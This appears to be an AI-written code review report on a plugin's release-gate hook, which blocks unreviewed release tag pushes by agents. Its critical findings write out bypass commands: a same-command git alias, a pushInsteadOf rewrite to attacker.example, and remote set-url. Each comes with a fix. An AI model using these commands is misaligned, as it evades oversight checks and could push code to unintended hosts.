---
phase: 12-v0-6-0-release-candidate-review
reviewed: 2026-05-23T04:08:21Z
depth: deep
files_reviewed: 64
files_reviewed_list:
  - .claude-plugin/plugin.json
  - .codex-plugin/plugin.json
  - /Users/shafqat/projects/codex-plugins/.agents/plugins/marketplace.json
  - CHANGELOG.md
  - README.md
  - agents/claude/codex-delegate.md
  - agents/claude/codex-delegate/SKILL.md
  - agents/claude/forge.md
  - agents/claude/forge/SKILL.md
  - agents/claude/forge:delegate/SKILL.md
  - agents/claude/kay:delegate/SKILL.md
  - agents/codex/codex-delegate.md
  - agents/codex/codex-delegate/SKILL.md
  - agents/codex/forge.md
  - agents/codex/forge/SKILL.md
  - agents/codex/forge:delegate/SKILL.md
  - agents/codex/kay:delegate/SKILL.md
  - context.md
  - hooks/lib/sidekick-registry.sh
  - hooks/scrub-legacy-user-hooks.py
  - hooks/validate-release-gate.sh
  - install.sh
  - scripts/render-agent-bundle.py
  - scripts/sync-host-surfaces.sh
  - silver-bullet.md
  - site/ARCHITECTURE.md
  - site/CICD.md
  - site/COMPATIBILITY.md
  - site/PRD-Overview.md
  - site/TESTING.md
  - site/help/concepts/index.html
  - site/help/getting-started/index.html
  - site/help/index.html
  - site/help/reference/index.html
  - site/help/search.js
  - site/help/troubleshooting/index.html
  - site/help/workflows/index.html
  - site/index.html
  - site/internal/pre-release-quality-gate.md
  - site/pre-release-quality-gate.md
  - skills/codex-delegate/SKILL.md
  - skills/forge/SKILL.md
  - tests/post_release_cleanup.bash
  - tests/run_all.bash
  - tests/run_live_codex_marketplace_install.bash
  - tests/run_live_codex_plugin_read.bash
  - tests/run_release.bash
  - tests/run_unit.bash
  - tests/test_agent_surface_render.bash
  - tests/test_clean_reinstall.bash
  - tests/test_codex_enforcer_hook.bash
  - tests/test_codex_marketplace_manifest.bash
  - tests/test_codex_marketplace_release_gate.bash
  - tests/test_docs_contract.bash
  - tests/test_forge_skill.bash
  - tests/test_help_site_navigation.bash
  - tests/test_homepage_sidekicks.bash
  - tests/test_host_surface_rewrite.bash
  - tests/test_install_sh.bash
  - tests/test_legacy_hook_scrub.bash
  - tests/test_post_release_cleanup.bash
  - tests/test_repo_layout.bash
  - tests/test_runner_contract.bash
  - tests/test_validate_release_gate_hook.bash
findings:
  critical: 3
  warning: 2
  info: 1
  total: 6
status: issues_found
---

# Phase 12: Code Review Report

**Reviewed:** 2026-05-23T04:08:21Z
**Depth:** deep
**Files Reviewed:** 64
**Status:** issues_found

## Summary

Reviewed the v0.6.0 release-gate diff `origin/main..a5552f2631564efc1fc782ddded06dd8f4eadfb2`, with extra inspection of the public Codex marketplace pin at `/Users/shafqat/projects/codex-plugins/.agents/plugins/marketplace.json`.

The marketplace pin is current (`version=0.6.0`, `ref=a5552f2631564efc1fc782ddded06dd8f4eadfb2`) and the sampled plugin integrity hashes match the manifest. The release gate is still not release-safe: there are fail-open paths around same-command Git config/alias mutation and local ref based GitHub release target resolution.

Verification performed:
- `bash -n` on changed shell scripts passed.
- `python3 -m py_compile scripts/render-agent-bundle.py hooks/scrub-legacy-user-hooks.py` passed.
- `git diff --check origin/main..a5552f2631564efc1fc782ddded06dd8f4eadfb2` passed.
- `bash tests/test_validate_release_gate_hook.bash` passed (`388 passed, 0 failed`), but one passing scenario encodes a stale-tag behavior that violates the release requirement.
- `CODEX_MARKETPLACE_FILE=/Users/shafqat/projects/codex-plugins/.agents/plugins/marketplace.json SIDEKICK_RELEASE_GATE=1 bash tests/test_codex_marketplace_manifest.bash` failed because the checkout is dirty (`?? ~/`).

## Narrative Findings (AI reviewer)

## Critical Issues

### CR-01: Same-command Git alias config bypasses the release hook entirely

**File:** `hooks/validate-release-gate.sh:4109`

**Issue:** Git alias expansion is checked only from persistent aliases and command-scoped `git -c alias.*` values. A same-command alias written through `git config alias.*` is not classified as a release command before the later alias invocation. A command shaped like:

```bash
git config alias.ship 'push origin HEAD:refs/tags/v1.2.1' && git ship
```

publishes a release tag when executed, but the hook currently emits no deny decision even with no quality-gate markers.

**Impact:** A release-tag publication can bypass all four stage markers and both live-pyramid markers.

**Fix:** Treat `git config alias.*`, `git config --add alias.*`, and `git config --replace-all alias.*` as release-sensitive config mutations. Recursively inspect the configured alias payload; if it could publish a release tag, require the gate and mark later same-command alias execution as unresolvable. Add a regression for the command above with no markers and with valid markers.

### CR-02: Same-command Git URL/remote rewrites are ignored before tag publication

**File:** `hooks/validate-release-gate.sh:5617`

**Issue:** Release target metadata tracks only prior `git tag` and `git update-ref` mutations. It does not track prior `git config url.*`, `git config remote.*`, or `git remote set-url` mutations in the same Bash command. With valid markers for `HEAD`, commands such as:

```bash
git config url.https://attacker.example/alo-exp/sidekick/.pushInsteadOf https://github.com/alo-exp/sidekick &&
git push https://github.com/alo-exp/sidekick.git HEAD:refs/tags/v1.2.1
```

and:

```bash
git remote set-url --push origin https://github.com/attacker/other.git &&
git push origin HEAD:refs/tags/v1.2.1
```

pass the hook because validation reads the pre-mutation config, while actual execution rewrites the push destination.

**Impact:** A command can satisfy markers for the Sidekick target SHA, then publish the tag to a different repository or host in the same shell invocation.

**Fix:** Maintain a `release_context_mutated` flag in the metadata pass for preceding `git config` keys under `remote.*`, `url.*`, `include.*`, `includeIf.*`, and for `git remote set-url/add/remove/rename`. If a release publication appears after such a mutation, return `unresolvable` and deny. Mirror the same guard in the classifier so unknown alias/config rewrites fail closed.

### CR-03: GitHub release target SHA is resolved from local refs, not the actual remote target

**File:** `hooks/validate-release-gate.sh:5727`

**Issue:** `gh release create --verify-tag` and `gh release create --target <branch-or-tag>` are resolved by GitHub against the remote repository, but the hook resolves `metadata_value^{commit}` in the local checkout. The code therefore authorizes based on local tag/branch state that may be stale or unrelated to the remote ref GitHub will use.

This is also locked into the tests: `tests/test_validate_release_gate_hook.bash:2250` expects a verified GitHub release with a stale local tag to pass when markers exist for that local tag.

**Impact:** Markers can be present for the wrong commit. A stale local `vX.Y.Z` tag or stale local `main` branch can authorize a GitHub release whose actual remote target SHA was never reviewed or live-tested.

**Fix:** For `gh release create`, fail closed unless the target is an explicit commit SHA that resolves in a trusted Sidekick checkout, or verify symbolic targets against the allowed remote with `git ls-remote --tags/--heads origin <ref>` and require the marker SHA to match that remote object. `--verify-tag` should verify the remote tag SHA, not a local tag.

## Important Issues

### IM-01: Tests assert the opposite of the stale-tag fail-closed requirement

**File:** `tests/test_validate_release_gate_hook.bash:2250`

**Issue:** The scenario named `verified gh release stale tag passes with tag target markers` expects pass-through for a stale local tag. That contradicts the release requirement that target SHA resolution fail closed for stale local tags.

**Impact:** The suite gives false confidence and will reject the correct fix unless the test is inverted.

**Fix:** Change the scenario to expect `permissionDecision=deny` unless the hook verifies the remote tag SHA and the markers match that remote SHA. Add a parallel `--target main` stale-local-branch case.

### IM-02: Current release-gate marketplace check fails because the checkout is dirty

**File:** `tests/test_codex_marketplace_manifest.bash:44`

**Issue:** In release-gate mode the marketplace manifest test requires a clean Sidekick checkout. Running it against the requested marketplace file failed at this check because `git status --porcelain` reports an untracked `~/` directory.

**Impact:** Even aside from the critical hook bugs, the current workspace cannot pass the release-gate marketplace validation.

**Fix:** Remove the accidental untracked `~/` directory or explicitly commit/ignore it if it is intentional. Re-run:

```bash
CODEX_MARKETPLACE_FILE=/Users/shafqat/projects/codex-plugins/.agents/plugins/marketplace.json \
SIDEKICK_RELEASE_GATE=1 bash tests/test_codex_marketplace_manifest.bash
```

## Minor Issues

### MN-01: No regression covers same-command Git config mutation before release push

**File:** `tests/test_validate_release_gate_hook.bash:2405`

**Issue:** The suite covers command-scoped `git -c url.*` rewrites and already-persistent URL rewrites, but it does not cover same-command persistent mutations such as `git config url.* && git push` or `git remote set-url && git push`.

**Impact:** The CR-02 fail-open path was able to ship despite extensive release-hook coverage.

**Fix:** Add tests that seed valid current markers and still expect deny for same-command URL/remote mutation before a tag push.

---

STATUS: success
ACCEPTED_FINDINGS: 5
ASSESSMENT: blocked
